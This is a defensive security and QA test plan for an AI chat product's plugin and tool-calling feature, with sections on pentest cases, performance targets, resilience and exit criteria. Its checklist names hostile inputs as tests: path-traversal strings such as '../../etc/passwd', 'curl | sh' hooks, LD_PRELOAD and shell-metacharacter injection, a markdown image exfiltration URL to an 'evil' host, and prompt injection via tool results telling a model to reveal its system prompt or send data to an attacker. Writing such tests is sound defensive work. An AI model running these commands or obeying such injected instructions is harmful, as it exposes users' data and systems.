## 2. Security / pentest checklist (each = a test with expected result)

1. SSRF: 71 URL + 28 DNS cases (exists); add OAuth endpoints, import URLs, redirect chains, IPv6 mapped, `file://`, `gopher://`, DNS rebinding between discovery and call.
2. Zip-slip (`../../etc/passwd`, absolute, `C:\`, `..\`), symlink to `/etc`, hardlink, zip bomb (ratio, file count, nested archives), device names (`NUL`, `CON`), case-fold duplicates, trailing dot/space names, unicode normalisation collisions, 0-byte files, path > 500 chars.
3. Malicious manifest: bidi/zero-width in names, prototype keys (`__proto__`), remote `$ref`, huge schema, 10k tools, tool name collision after folding, native tool name > 64, `command` with shell metachars, `url` to private host, header `Host`/`Cookie`.
4. Prompt injection via tool results and tool descriptions: result says "call tool X / reveal system prompt / send to attacker URL"; tool description with instructions; rug-pull (tool list changes after approval -> NEEDS_REVIEW, calls blocked); markdown image exfil `![](https://evil/?q=...)` rendered in chat.
5. Secret leakage: grep API/logs/errors/audit for the credential string after PUT credential; error path with invalid key; export/account data; cross-user credential row copied to another user cannot decrypt (AAD).
6. OAuth: missing/reused/expired `state`, redirect_uri mismatch/open redirect, code interception without PKCE verifier, token in URL/logs, CSRF on callback, scope escalation, mix-up (wrong issuer), token refresh race, revoke on uninstall.
7. Command injection in stdio (only when built or in the VS Code agent): args with `;`, `$()`, env injection `LD_PRELOAD`, cwd escape, `npx` typo-squat, unsigned remote script; hooks that run `curl | sh`; digest re-approval when hook changes (VS Code: hooksDigest exists).
8. AuthZ: IDOR on install/server/credential/consent; PLUGINS_ADMIN routes with USER token; internal routes without service token; plan bypass via concurrent install (advisory lock test, 20 parallel).
9. DoS: 1 GB response, endless SSE, slowloris server, 1000 tools, deep JSON, regex ReDoS in HTML/SSE parsers, 100 concurrent calls, rate-limit headers.
10. Supply chain for import: tag moved after review (pin by sha), repo renamed, submodules, LFS pointers, `.gitattributes` tricks.

## 3. Performance

Targets (propose): catalog list p95 < 300 ms at 500 entries; install p95 < 500 ms; invoke overhead (excluding remote) p95 < 150 ms; resolve p95 < 200 ms with 5 mentions; chat TTFT regression < 100 ms for messages without pluginRefs; 200 concurrent invokes without breaker flapping; 64 tools/server discovery < 5 s.

## 4. Resilience

Server down (breaker opens after 5 consecutive, half-open at 30 s, one probe), 10 s/60 s slow, partial SSE, HTTP 500/429 with Retry-After, TLS expired, DNS NXDOMAIN, 100 MB body, tools/list changes mid-session, auth-service down (fail closed: no call), Redis down (consent wait), plugin-service restart mid-call (duplicate callId -> 409 or replay), chat client disconnect (abort propagates).

## 5. Exit criteria per phase

- All new unit/contract/API tests green, SSRF suite unchanged and green, no P0/P1 open, evidence record valid, docs updated (rule 63), live QA with real users on claw.local, no secret in any log (automated grep), a11y 0 critical axe issues, 13-locale snapshot clean, rollback tested (feature flag/`PluginSetting` off), prod deploy checklist (rule 05, add-a-service skill) done.
- MVP: S1-S5 acceptance + regression round section 6 "Round A".
- Next: + OAuth + import suites + Round B. Later: + skills + team + sandbox.

## 6. Defect workflow

Severity: S0 security/data/money (stop-ship, fix same day, add regression test), S1 feature unusable or wrong tool executed, S2 degraded with workaround, S3 cosmetic/i18n. Flow: log with evidence (request id, audit row id, screenshot) -> triage within 1 day -> fix + test first (TDD) -> retest by a different person -> add to regression pack -> closed only with passing evidence. No "fixed" without live verification (rule 44).
